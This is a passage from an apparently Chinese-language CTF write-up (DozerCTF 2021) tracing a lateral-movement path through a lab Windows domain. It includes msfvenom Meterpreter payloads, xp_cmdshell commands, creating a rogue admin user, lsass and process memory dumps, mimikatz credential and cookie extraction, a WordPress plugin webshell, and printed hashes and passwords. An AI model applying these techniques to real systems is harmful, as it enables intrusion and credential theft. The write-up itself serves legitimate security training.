punctuation">&lt;</span>assemblyIdentity</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>System.Web.Cors<span class="token punctuation">"</span></span> <span class="token attr-name">publicKeyToken</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>31bf3856ad364e35<span class="token punctuation">"</span></span> <span class="token attr-name">culture</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>neutral<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bindingRedirect</span> <span class="token attr-name">oldVersion</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0.0.0.0-5.2.3.0<span class="token punctuation">"</span></span> <span class="token attr-name">newVersion</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>5.2.3.0<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependentAssembly</span><span class="token punctuation">&gt;</span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependentAssembly</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>assemblyIdentity</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Microsoft.AspNet.SignalR.Core<span class="token punctuation">"</span></span> <span class="token attr-name">publicKeyToken</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>31bf3856ad364e35<span class="token punctuation">"</span></span> <span class="token attr-name">culture</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>neutral<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bindingRedirect</span> <span class="token attr-name">oldVersion</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0.0.0.0-2.2.1.0<span class="token punctuation">"</span></span> <span class="token attr-name">newVersion</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2.2.1.0<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependentAssembly</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>assemblyBinding</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>runtime</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">&gt;</span></span></code></pre><p>è§£ç ä¸€ä¸‹ <code>ConnectionString</code> å¯ä»¥å¾—åˆ°æ•°æ®åº“çš„è¿æ¥ä¿¡æ¯ã€‚</p><pre class="language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span> <span class="token string">"Zg3p37CSquO0slash0DelgBGFVO0J0BlhMxqbj6HR98UP8h4kojeoW8A0slash0xZh4im63w0tn2nuW7n5XRcDo0equals0"</span>s <span class="token operator">=</span> s<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"0add0"</span><span class="token punctuation">,</span> <span class="token string">"+"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"0equals0"</span><span class="token punctuation">,</span> <span class="token string">"="</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"0and0"</span><span class="token punctuation">,</span> <span class="token string">"&amp;"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"0question0"</span><span class="token punctuation">,</span> <span class="token string">"?"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"0slash0"</span><span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token comment"># Zg3p37CSquO/DelgBGFVO0J0BlhMxqbj6HR98UP8h4kojeoW8A/xZh4im63w0tn2nuW7n5XRcDo=</span></code></pre><p>C# è§£ç </p><pre class="language-c#" data-language="c#"><code class="language-c#">using System;using System.IO;using System.Security.Cryptography;using System.Text;namespace EncryptApplication{ class Encrypt{ static void Main(string[] args){    var _encryptKey = "vEnfkn16t8aeaZKG3a4Gl9UUlzf4vgqU9xwh8ZV5";    var _decryptKey = "vEnfkn16t8aeaZKG3a4Gl9UUlzf4vgqU9xwh8ZV5";    var _inputString = "Zg3p37CSquO/DelgBGFVO0J0BlhMxqbj6HR98UP8h4kojeoW8A/xZh4im63w0tn2nuW7n5XRcDo=";    var _outString = "";    var _noteMessage = "";    byte[] iv = { 0x12, 0x34, 0x56, 0x78, 0x90, 0xAB, 0xCD, 0xEF };    try    {        var byKey = Encoding.UTF8.GetBytes(_decryptKey.Substring(0, 8));        var des = new DESCryptoServiceProvider();        var inputByteArray = Convert.FromBase64String(_inputString);        var ms = new MemoryStream();        var cs = new CryptoStream(ms, des.CreateDecryptor(byKey, iv),                                  CryptoStreamMode.Write);        cs.Write(inputByteArray, 0, inputByteArray.Length);        cs.FlushFinalBlock();        Encoding encoding = new UTF8Encoding();        _outString = encoding.GetString(ms.ToArray());        Console.WriteLine("DesEncrypt:"); Console.WriteLine(_outString);    }    catch (Exception error) { _noteMessage 27 = error.Message; }} } }</code></pre><p>å¾—åˆ°</p><pre class="language-none"><code class="language-none">DesEncrypt:server=10.10.1.231;uid=sa;pwd=msO.9uXC;database=site</code></pre><blockquote><p>é¡ºä¾¿å†ç»ƒä¹ ä¸€ä¸‹ï¼Œæ•´ä¸ª msf ä¸Šçº¿å¥½äº†ã€‚</p><p>ç”±äºä¸å‡ºç½‘ä¸æ–¹ä¾¿æ‰“åå‘è¿æ¥ï¼Œè¿™é‡Œæ•´ä¸ªæ­£å‘è¿æ¥å§ã€‚</p><p>é¦–å…ˆåˆ©ç”¨ <code>msfvenom</code> ç”Ÿæˆä¸€ä¸ªæ­£å‘è¿æ¥çš„ payloadã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">msfvenom -p windows/meterpreter/bind_tcp <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">23333</span> -f exe -o <span class="token number">1</span>.exe</code></pre><p>ä¸Šä¼ åæ‰§è¡Œå®ƒ</p><p><img src="/2021/06/20/Penetration_2021DozerCTF/image-20210605030228584.png"></p><p>ç„¶åæŸ¥çœ‹ä¸€ä¸‹ç½‘ç»œè¿æ¥ã€‚</p><pre class="language-sh" data-language="sh"><code class="language-sh">netstat -ano</code></pre><p>å¯ä»¥çœ‹åˆ°æˆåŠŸç›‘å¬äº† 23333 ç«¯å£ã€‚è¯´æ˜å·²ç»è·‘èµ·æ¥äº†ã€‚</p><p><img src="/2021/06/20/Penetration_2021DozerCTF/image-20210605023739974.png"></p><p>åœ¨ msf é‡Œæ‰§è¡Œç›‘å¬ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">msfconsoleuse exploit/multi/handler<span class="token builtin class-name">set</span> payload windows/meterpreter/bind_tcp <span class="token builtin class-name">set</span> rhost <span class="token number">10.10</span>.1.234<span class="token builtin class-name">set</span> lport <span class="token number">23333</span>exploit</code></pre><p>æ‹¿åˆ° Meterpreter ä¼šè¯ã€‚</p><p><img src="/2021/06/20/Penetration_2021DozerCTF/image-20210605030211958.png"></p></blockquote><h2 id="0x03-10-10-1-231-MSSQL"><a href="#0x03-10-10-1-231-MSSQL" class="headerlink" title="0x03 10.10.1.231 MSSQL"></a>0x03 10.10.1.231 MSSQL</h2><p>é‚£å°±ç›´æ¥ä»æ•°æ®åº“è¿™é‡Œæ—¥å§ã€‚</p><p>ç›´æ¥ç”¨ <code>xp_cmdshell</code> æ‰§è¡Œå‘½ä»¤å¥½äº†ã€‚</p><p>ConnString:</p><pre class="language-none"><code class="language-none">server=10.10.1.231;uid=sa;pwd=msO.9uXC;database=site;Provider=SQLOLEDB;</code></pre><p><img src="/2021/06/20/Penetration_2021DozerCTF/image-20210603045759790.png" alt="whoami"></p><p>å‘ç°å°±æ˜¯ç®¡ç†å‘˜ï¼Œå¥½å”‰ï¼</p><p><img src="/2021/06/20/Penetration_2021DozerCTF/image-20210603045547214.png" alt="net user"></p><p><code>systeminfo</code> çœ‹ä¸‹ç³»ç»Ÿä¿¡æ¯ã€‚</p><pre class="language-none"><code class="language-none">ä¸»æœºå: SQLSERVER14OS åç§°: Microsoft Windows Server 2012 StandardOS ç‰ˆæœ¬: 6.2.9200 æš‚ç¼º Build 9200OS åˆ¶é€ å•†: Microsoft CorporationOS é…ç½®: æˆå‘˜æœåŠ¡å™¨OS æ„ä»¶ç±»å‹: Multiprocessor Freeæ³¨å†Œçš„æ‰€æœ‰äºº: Windows ç”¨æˆ·æ³¨å†Œçš„ç»„ç»‡:äº§å“ ID: 00184-00070-00000-AAOEMåˆå§‹å®‰è£…æ—¥æœŸ: 2021/5/8, 21:38:55ç³»ç»Ÿå¯åŠ¨æ—¶é—´: 2021/6/2, 22:38:53ç³»ç»Ÿåˆ¶é€ å•†: VMware, Inc.ç³»ç»Ÿå‹å·: VMware Virtual Platformç³»ç»Ÿç±»å‹: x64-based PCå¤„ç†å™¨: å®‰è£…äº† 2 ä¸ªå¤„ç†å™¨ã€‚[01]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~1796 Mhz[02]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~1796 MhzBIOS ç‰ˆæœ¬: Phoenix Technologies LTD 6.00, 2019/7/29Windows ç›®å½•: C:\Windowsç³»ç»Ÿç›®å½•: C:\Windows\system32å¯åŠ¨è®¾å¤‡: \Device\HarddiskVolume1ç³»ç»ŸåŒºåŸŸè®¾ç½®: zh-cn;ä¸­æ–‡(ä¸­å›½)è¾“å…¥æ³•åŒºåŸŸè®¾ç½®: zh-cn;ä¸­æ–‡(ä¸­å›½)æ—¶åŒº: (UTC+08:00)åŒ—äº¬ï¼Œé‡åº†ï¼Œé¦™æ¸¯ç‰¹åˆ«è¡Œæ”¿åŒºï¼Œä¹Œé²æœ¨é½ç‰©ç†å†…å­˜æ€»é‡: 4,095 MBå¯ç”¨çš„ç‰©ç†å†…å­˜: 2,421 MBè™šæ‹Ÿå†…å­˜: æœ€å¤§å€¼: 8,191 MBè™šæ‹Ÿå†…å­˜: å¯ç”¨: 6,463 MBè™šæ‹Ÿå†…å­˜: ä½¿ç”¨ä¸­: 1,728 MBé¡µé¢æ–‡ä»¶ä½ç½®: C:\pagefile.sysåŸŸ: dozer.orgç™»å½•æœåŠ¡å™¨: æš‚ç¼ºä¿®è¡¥ç¨‹åº: å®‰è£…äº† 2 ä¸ªä¿®è¡¥ç¨‹åºã€‚[01]: KB2999226[02]: KB4012214ç½‘å¡: å®‰è£…äº† 1 ä¸ª NICã€‚[01]: Intel(R) 82574L åƒå…†ç½‘ç»œè¿æ¥è¿æ¥å: Ethernet0å¯ç”¨ DHCP: å¦IP åœ°å€[01]: 10.10.1.231[02]: fe80::f57d:729c:172a:abd6Hyper-V è¦æ±‚: å·²æ£€æµ‹åˆ°è™šæ‹Ÿæœºç›‘æ§ç¨‹åºã€‚å°†ä¸æ˜¾ç¤º Hyper-V æ‰€éœ€çš„åŠŸèƒ½ã€‚</code></pre><p>å¥½å®¶ä¼™ï¼Œè¿™å°æœºå™¨åœ¨åŸŸ: dozer.org é‡Œäº†ï¼</p><p>è¿™å› flag ç»ˆäºåœ¨ <code>Administrator</code> ç”¨æˆ·æ¡Œé¢ä¸Šäº†ã€‚</p><p>å¦å¤–è¿™ä¸ª <code>DozerOCS.exe</code> æ˜¯ä»€ä¹ˆç©æ„ï¼Ÿ</p><p><img src="/2021/06/20/Penetration_2021DozerCTF/image-20210603050714365.png" alt="dir"></p><pre class="language-none"><code class="language-none">Exec master.dbo.xp_cmdshell 'type C:\Users\Administrator\Desktop\flag.txt'DozerCTF{b305d6b074502f341e793c29d821cadd}</code></pre><p><img src="/2021/06/20/Penetration_2021DozerCTF/image-20210603050829137.png" alt="flag"></p><p>ç„¶åå†è€ƒè™‘ä¸€ä¸‹è·å–ç”¨æˆ·å¯†ç ï¼Œè¯´ä¸å®šæœ‰åŸŸç®¡çš„ hashã€‚</p><p><code>tasklist</code> çœ‹ä¸€çœ‹ï¼Œå‘ç°æœ‰æ€è½¯ã€‚</p><pre class="language-none"><code class="language-none">æ˜ åƒåç§° PID ä¼šè¯å ä¼šè¯# å†…å­˜ä½¿ç”¨========================= ======== ================ =========== ============System Idle Process 0 Services 0 20 KSystem 4 Services 0 368 Ksmss.exe 332 Services 0 1,044 Kcsrss.exe 432 Services 0 5,964 Kwininit.exe 512 Services 0 3,900 Kcsrss.exe 520 Console 1 27,296 Kwinlogon.exe 564 Console 1 6,688 Kservices.exe 608 Services 0 9,572 Klsass.exe 616 Services 0 13,740 Ksvchost.exe 708 Services 0 9,172 Ksvchost.exe 760 Services 0 6,852 Ksvchost.exe 808 Services 0 16,076 Kdwm.exe 872 Console 1 48,020 Ksvchost.exe 884 Services 0 44,172 Ksvchost.exe 964 Services 0 13,484 Ksvchost.exe 660 Services 0 16,520 Ksvchost.exe 1108 Services 0 11,084 Kspoolsv.exe 1276 Services 0 11,364 Ksvchost.exe 1312 Services 0 7,696 Ksqlservr.exe 1340 Services 0 153,868 Ksqlwriter.exe 1472 Services 0 5,824 Ksvchost.exe 1520 Services 0 12,036 KVGAuthService.exe 1544 Services 0 8,616 Kvmtoolsd.exe 1580 Services 0 19,000 Ksvchost.exe 1600 Services 0 8,144 Kavp.exe 1628 Services 0 26,532 Ksvchost.exe 2052 Services 0 4,724 KWmiPrvSE.exe 2248 Services 0 24,720 Kdllhost.exe 2348 Services 0 10,420 Kmsdtc.exe 2564 Services 0 7,268 Kavpui.exe 3076 Console 1 186,908 Ktaskhostex.exe 3132 Console 1 14,008 Kexplorer.exe 3240 Console 1 103,624 Kvm3dservice.exe 3944 Console 1 3,588 Kvmtoolsd.exe 3956 Console 1 32,316 Kavpsus.exe 3184 Services 0 7,920 KWmiPrvSE.exe 2212 Services 0 6,128 Kpowershell.exe 1048 Console 1 71,740 Kconhost.exe 3148 Console 1 28,332 Kpowershell.exe 3188 Console 1 71,192 Kconhost.exe 2300 Console 1 27,784 KDozerOCS.exe 3728 Console 1 6,948 Ksvchost.exe 4828 Services 0 37,936 Kcsrss.exe 3572 RDP-Tcp#0 2 17,632 Kwinlogon.exe 3844 RDP-Tcp#0 2 5,840 Kdwm.exe 4440 RDP-Tcp#0 2 31,812 Kavpui.exe 4124 RDP-Tcp#0 2 664 Ktaskhostex.exe 4752 RDP-Tcp#0 2 8,980 Krdpclip.exe 2692 RDP-Tcp#0 2 6,404 Kmsiexec.exe 5100 Services 0 4,772 Kexplorer.exe 3296 RDP-Tcp#0 2 81,692 KServerManager.exe 1176 RDP-Tcp#0 2 113,916 KWmiPrvSE.exe 1384 Services 0 10,948 KTaskmgr.exe 4444 RDP-Tcp#0 2 37,920 Kvm3dservice.exe 2204 RDP-Tcp#0 2 3,516 Kcmd.exe 3556 Services 0 2,084 Kconhost.exe 4992 Services 0 2,908 Ktasklist.exe 1196 Services 0 5,500 K</code></pre><p><code>avp.exe &lt;=&gt; Kaspersky</code> å¡å·´æ–¯åŸº</p><p>çœ‹ä¸‹ç½‘ç»œè¿æ¥ï¼Œæœ‰ 3389ï¼Œåº”è¯¥æ˜¯è¿œç¨‹æ¡Œé¢ã€‚</p><blockquote><p>è¿™é‡Œå¤ç°çš„æ—¶å€™è¿˜å‘ç°æ²¡å¼€è¿œç¨‹æ¡Œé¢ï¼Œç„¶ååˆæŒ‰ç…§ 0x02 ä¸­çš„æ–¹æ³•å…ˆæ‰“å¼€â€¦â€¦</p></blockquote><pre class="language-none"><code class="language-none"># netstat -anoæ´»åŠ¨è¿æ¥ åè®® æœ¬åœ°åœ°å€ å¤–éƒ¨åœ°å€ çŠ¶æ€ PIDTCP 0.0.0.0:80 0.0.0.0:0 LISTENING 4TCP 0.0.0.0:135 0.0.0.0:0 LISTENING 796TCP 0.0.0.0:445 0.0.0.0:0 LISTENING 4TCP 0.0.0.0:1433 0.0.0.0:0 LISTENING 1304TCP 0.0.0.0:3389 0.0.0.0:0 LISTENING 1388TCP 0.0.0.0:5985 0.0.0.0:0 LISTENING 4TCP 0.0.0.0:47001 0.0.0.0:0 LISTENING 4TCP 0.0.0.0:49152 0.0.0.0:0 LISTENING 524TCP 0.0.0.0:49153 0.0.0.0:0 LISTENING 872TCP 0.0.0.0:49154 0.0.0.0:0 LISTENING 928TCP 0.0.0.0:49155 0.0.0.0:0 LISTENING 636TCP 0.0.0.0:49177 0.0.0.0:0 LISTENING 620TCP 0.0.0.0:49182 0.0.0.0:0 LISTENING 636TCP 0.0.0.0:49238 0.0.0.0:0 LISTENING 1304TCP 10.10.1.231:139 0.0.0.0:0 LISTENING 4TCP 10.10.1.231:1433 10.10.1.234:49404 ESTABLISHED 1304TCP 10.10.1.231:1433 10.10.1.234:49410 ESTABLISHED 1304TCP 10.10.1.231:1433 10.10.1.234:49411 ESTABLISHED 1304TCP 10.10.1.231:1433 10.10.1.234:49412 ESTABLISHED 1304TCP 10.10.1.231:1433 10.10.1.234:49413 ESTABLISHED 1304TCP 10.10.1.231:1433 10.10.1.234:49414 ESTABLISHED 1304TCP 10.10.1.231:1433 10.10.1.234:49417 ESTABLISHED 1304TCP 127.0.0.1:49192 127.0.0.1:49193 ESTABLISHED 1604TCP 127.0.0.1:49193 127.0.0.1:49192 ESTABLISHED 1604TCP 127.0.0.1:49194 0.0.0.0:0 LISTENING 1604TCP 127.0.0.1:49195 127.0.0.1:49196 ESTABLISHED 1604TCP 127.0.0.1:49196 127.0.0.1:49195 ESTABLISHED 1604TCP 127.0.0.1:49220 127.0.0.1:49221 ESTABLISHED 3744TCP 127.0.0.1:49221 127.0.0.1:49220 ESTABLISHED 3744TCP 127.0.0.1:49226 127.0.0.1:49227 ESTABLISHED 1604TCP 127.0.0.1:49227 127.0.0.1:49226 ESTABLISHED 1604TCP [::]:80 [::]:0 LISTENING 4TCP [::]:135 [::]:0 LISTENING 796TCP [::]:445 [::]:0 LISTENING 4TCP [::]:1433 [::]:0 LISTENING 1304TCP [::]:3389 [::]:0 LISTENING 1388TCP [::]:5985 [::]:0 LISTENING 4TCP [::]:47001 [::]:0 LISTENING 4TCP [::]:49152 [::]:0 LISTENING 524TCP [::]:49153 [::]:0 LISTENING 872TCP [::]:49154 [::]:0 LISTENING 928TCP [::]:49155 [::]:0 LISTENING 636TCP [::]:49177 [::]:0 LISTENING 620TCP [::]:49182 [::]:0 LISTENING 636TCP [::]:49238 [::]:0 LISTENING 1304UDP 0.0.0.0:123 *:* 1000UDP 0.0.0.0:500 *:* 928UDP 0.0.0.0:3389 *:* 1388UDP 0.0.0.0:4500 *:* 928UDP 0.0.0.0:5355 *:* 520UDP 0.0.0.0:64354 *:* 520UDP 10.10.1.231:137 *:* 4UDP 10.10.1.231:138 *:* 4UDP 127.0.0.1:50457 *:* 2964UDP 127.0.0.1:53687 *:* 2964UDP 127.0.0.1:56295 *:* 928UDP 127.0.0.1:59110 *:* 2964UDP 127.0.0.1:61057 *:* 520UDP 127.0.0.1:61059 *:* 636UDP 127.0.0.1:61187 *:* 2964UDP [::]:123 *:* 1000UDP [::]:500 *:* 928UDP [::]:3389 *:* 1388UDP [::]:4500 *:* 928UDP [::]:5355 *:* 520UDP [::]:64354 *:* 520</code></pre><p>ä¸ºäº†æ–¹ä¾¿ï¼Œå…ˆåŠ ä¸ªç”¨æˆ·ï¼Œç„¶å rdp ä¸Šå»çœ‹çœ‹ã€‚</p><pre class="language-sh" data-language="sh"><code class="language-sh">net user /add root test456123!net localgroup administrators root /add</code></pre><p><img src="/2021/06/20/Penetration_2021DozerCTF/image-20210603051645886.png"></p><p>å°è¯•åˆ›å»º <code>lsass.exe</code> çš„è½¬å‚¨æ–‡ä»¶ï¼Œç„¶è€Œåˆšç‚¹å°±è¢«ææ‰äº†ã€‚</p><p>ï¼ˆæ­¤å¤„å¥½æƒ³æŠŠå¡å·´æ–¯åŸºé€€å‡º</p><blockquote><p>æ ¹æ®å®˜æ–¹é¢˜è§£çš„è¯ï¼Œè¿™é‡Œçš„ <code>DozerOCS.exe</code> æ˜¯ Alice ç”¨æˆ·ï¼ˆä¹Ÿå°±æ˜¯ä¸‹æ–‡ä¸­ wordpress çš„ç”¨æˆ·ï¼‰èµ·çš„ï¼Œåº”è¯¥æ˜¯ dump è¿™ä¸ªçš„</p><p><del>ç„¶è€Œå’±å¤ç°çš„æ—¶å€™ tasklist é‡Œæ²¡è¿™ä¸ªç©æ„å•Šâ€¦â€¦</del>ï¼ˆåº”è¯¥æ˜¯è¢«ä¹‹å‰è¿›æ¥çš„å¸ˆå‚…ä»¬æ—¥åäº† Orz</p><p>åæ¥ç¯å¢ƒåˆé‡ç½®äº†ä¸€æ¬¡ï¼Œè¿™å›æœ‰äº†ï¼Œä¸Šé¢è¯´çš„ tasklist å·²ç»æ”¹æˆæ–°çš„äº†ã€‚</p><p><img src="/2021/06/20/Penetration_2021DozerCTF/image-20210605032928155.png"></p></blockquote><p>åˆ›å»ºè½¬å‚¨æ–‡ä»¶ã€‚</p><p><img src="/2021/06/20/Penetration_2021DozerCTF/image-20210605033017611.png"></p><p>è¿™é‡Œç›´æ¥å€ŸåŠ© 234 æœºå™¨ä¸Šçš„æœ¨é©¬ï¼ŒæŠŠ dmp ä¼ åˆ° 234 æœºå™¨ä¸Šï¼Œæœ¬åœ°å†æ‹–å›æ¥ã€‚</p><blockquote><p>è¿™é‡Œä¸Šä¼ çš„æ—¶å€™å‘ç°ç›´æ¥ä¸Šä¼ ä¼šæŠ¥é”™ï¼Œå‹ç¼©ä¹‹åå°±æ²¡äº‹äº†ã€‚</p><p>å…¶å®æ›´å¥½çš„æ–¹æ¡ˆæ¯”å¦‚ç”¨ powershell èµ·ä¸ª web æœåŠ¡ï¼Œæˆ–è€…æŠŠæ–‡ä»¶é€šè¿‡å‘½ä»¤è¡Œ post åˆ°å…¶ä»–æœºå™¨ä¸Šï¼Œå†æˆ–è€…ç”¨ <code>net use</code> æ‹–å›æ¥ï¼Ÿ</p></blockquote><p><img src="/2021/06/20/Penetration_2021DozerCTF/image-20210605033937480.png"></p><pre class="language-bash" data-language="bash"><code class="language-bash">strings DozerOCS.DMP <span class="token operator">|</span> <span class="token function">grep</span> ldap</code></pre><p>å¾—åˆ° Alice çš„ç”¨æˆ·ä¿¡æ¯ã€‚</p><p><img src="/2021/06/20/Penetration_2021DozerCTF/image-20210605035010475.png" alt="ldap"></p><pre class="language-none"><code class="language-none">ldap://dc01.dozer.org:389|CN=AliceAlc,CN=Users,DC=dozer,DC=org|FkuWvj08</code></pre><p>å¯†ç  <code>FkuWvj08</code></p><p>å¦å¤–ï¼Œç”±äºæ²¡åšå…æ€ï¼Œè¿™å°æœºå™¨ä¸Š msf æœ¨é©¬è¢«æ€äº†ï¼ˆï¼ˆä¹‹åæœ‰æœºä¼šå†ç ”ç©¶ç ”ç©¶å…æ€å§</p><h2 id="0x04-10-10-1-121-DESKTOP-ALICE"><a href="#0x04-10-10-1-121-DESKTOP-ALICE" class="headerlink" title="0x04 10.10.1.121 DESKTOP-ALICE"></a>0x04 10.10.1.121 DESKTOP-ALICE</h2><p>ç›²çŒœç”¨æˆ·å <code>Alice</code>ï¼Œåˆ©ç”¨ä¸Šé¢å¾—åˆ°çš„å¯†ç ç™»å½• DESKTOP-ALICEã€‚</p><p><img src="/2021/06/20/Penetration_2021DozerCTF/image-20210605035347889.png"></p><p>è¿™å°ä¹Ÿåœ¨åŸŸé‡Œã€‚</p><p><img src="/2021/06/20/Penetration_2021DozerCTF/image-20210605041013119.png" alt="systeminfo"></p><p>æ¡Œé¢ä¸Šå¾—åˆ° flagã€‚</p><p><img src="/2021/06/20/Penetration_2021DozerCTF/image-20210605035848984.png" alt="flag"></p><p>åŒæ ·ï¼Œä¸Šçº¿ msf</p><p><img src="/2021/06/20/Penetration_2021DozerCTF/image-20210605035826040.png"></p><p>çœ‹äº†ä¸€ä¸‹è¿™å°ä¸Šé¢ä¹Ÿæ²¡æœ‰åŸŸç®¡çš„ hashã€‚</p><h2 id="0x05-10-10-1-250-WordPress"><a href="#0x05-10-10-1-250-WordPress" class="headerlink" title="0x05 10.10.1.250 WordPress"></a>0x05 10.10.1.250 WordPress</h2><p>ç®¡ç†å‘˜ç”¨æˆ·åä¸º <code>alice</code></p><p><img src="/2021/06/20/Penetration_2021DozerCTF/image-20210605233039368.png"></p><p>çœ‹çœ‹ 121 æœºå™¨ä¸­ Chrome çš„ Cookieï¼š</p><p><code>C:\Users\ALICE\AppData\Local\Google\Chrome\User Data\Default\Cookies</code></p><p>æ•´ä¸ª mimikatz è·å–ä¸€ä¸‹ Cookieã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">dpapi::chrome /in:<span class="token string">"C:\Users\ALICE\AppData\Local\Google\Chrome\User Data\Default\Cookies"</span> /unprotect</code></pre><p>ç„¶è€Œå‘ç°å¤ç°çš„æ—¶å€™ç¯å¢ƒè¢«ç ´åæ‰äº†â€¦â€¦ï¼ˆå–µå‘œï¼</p><p><img src="/2021/06/20/Penetration_2021DozerCTF/image-20210605042205263.png"></p><p>é¡ºä¾¿ä¹Ÿåœ¨ä¸Šé¢çœ‹åˆ°äº†ä¹‹å‰å¸ˆå‚…è¿›æ¥ç”¨ <code>hack-browser-data.exe</code> å¯¼å‡ºçš„æµè§ˆå™¨æ•°æ®ï¼Œç„¶è€Œä¹Ÿæ²¡ç”¨æ¥ç™»å½•çš„ cookie äº†â€¦â€¦</p><p><img src="/2021/06/20/Penetration_2021DozerCTF/image-20210605043437063.png"></p><p>å¦å¤–è¿˜å‘ç°äº†ç”¨æˆ·åå’Œå¯†ç ã€‚</p><pre class="language-none"><code class="language-none">UserName,Password,LoginUrl,CreateDateAlice,Alice@Dozer@2021,http://10.10.1.250,2021-05-27T22:57:09+08:00</code></pre><p>ç™»å½•è¿›æ¥äº†ã€‚</p><p><img src="/2021/06/20/Penetration_2021DozerCTF/image-20210605051911466.png"></p><p>ç‰ˆæœ¬å· WordPress 5.2</p><p>æ’ä»¶ç®¡ç†å™¨é‡ŒåŠ ä¸ªä¸€å¥è¯æœ¨é©¬ã€‚</p><p><img src="/2021/06/20/Penetration_2021DozerCTF/image-20210605054919383.png"></p><p><img src="/2021/06/20/Penetration_2021DozerCTF/image-20210605054757985.png"></p><p><a href="http://10.10.1.250/wp-content/plugins/hello.php">http://10.10.1.250/wp-content/plugins/hello.php</a></p><p><img src="/2021/06/20/Penetration_2021DozerCTF/image-20210605055006696.png"></p><p>flag åœ¨ wordpress ç”¨æˆ·æ¡Œé¢ã€‚</p><p><img src="/2021/06/20/Penetration_2021DozerCTF/image-20210605055426406.png"></p><p><img src="/2021/06/20/Penetration_2021DozerCTF/image-20210605055641988.png" alt="systeminfo"></p><p>é¡ºä¾¿ä¸Šçº¿ msfã€‚</p><h2 id="0x06-10-10-1-1-DC"><a href="#0x06-10-10-1-1-DC" class="headerlink" title="0x06 10.10.1.1 DC"></a>0x06 10.10.1.1 DC</h2><p>åœ¨ 250 æœºå™¨ä¸ŠæŠŠå†…å­˜ä¸­çš„ç™»å½•ä¿¡æ¯ dump å‡ºæ¥ã€‚</p><p><img src="/2021/06/20/Penetration_2021DozerCTF/image-20210605063017449.png"></p><p><img src="/2021/06/20/Penetration_2021DozerCTF/image-20210605063329180.png"></p><p>æˆ–è€…ä¸Šå»ç”¨ mimikatz æ‰§è¡Œï¼Œå†æˆ–è€…æŠŠ <code>lsass.exe</code> dump ä¸‹æ¥æ‹–å›æœ¬åœ°å†æå–ä¹Ÿè¡Œã€‚</p><pre class="language-sh" data-language="sh"><code class="language-sh"># ç›´æ¥åœ¨æœºå™¨ä¸ŠæŠ“å–mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords full" exit# æ‹‰å›æœ¬åœ°å¤„ç†mimikatz.exe "sekurlsa::minidump lsass.dmp"sekurlsa::logonpasswords</code></pre><pre class="language-none"><code class="language-none">Authentication Id : 0 ; 27358144 (00000000:01a173c0)Session           : Interactive from 4User Name         : DWM-4Domain            : Window ManagerLogon Server      : (null)Logon Time        : 2021/5/31 14:34:20SID               : S-1-5-90-4        msv :         [00000003] Primary         * Username : WEB02$         * Domain   : DOZER         * NTLM     : b943c070d6b172a110ac4a7a02cb0995         * SHA1     : 5974013dfc3df4584e32d923dcb67a36236926ee        tspkg :        wdigest :         * Username : WEB02$         * Domain   : DOZER         * Password : 0]nCM-wq:#yu`.nHaH Kb^ Y4ehToFRWBT &amp;ZJVXNAhGHQI)QXAM4K-8_FY=sJ*DGwmoevtkPt60YT.EA%&lt;h&amp;!SQS]"1`4Ruf6rrgi_J%1wy!0:%f*#b%@)U        kerberos :         * Username : WEB02$         * Domain   : dozer.org         * Password : 0]nCM-wq:#yu`.nHaH Kb^ Y4ehToFRWBT &amp;ZJVXNAhGHQI)QXAM4K-8_FY=sJ*DGwmoevtkPt60YT.EA%&lt;h&amp;!SQS]"1`4Ruf6rrgi_J%1wy!0:%f*#b%@)U        ssp :        credman :Authentication Id : 0 ; 528906 (00000000:0008120a)Session           : Interactive from 3User Name         : wordpressDomain            : WEB02Logon Server      : WEB02Logon Time        : 2021/5/30 3:23:02SID               : S-1-5-21-304103692-1934564980-1899848695-1001     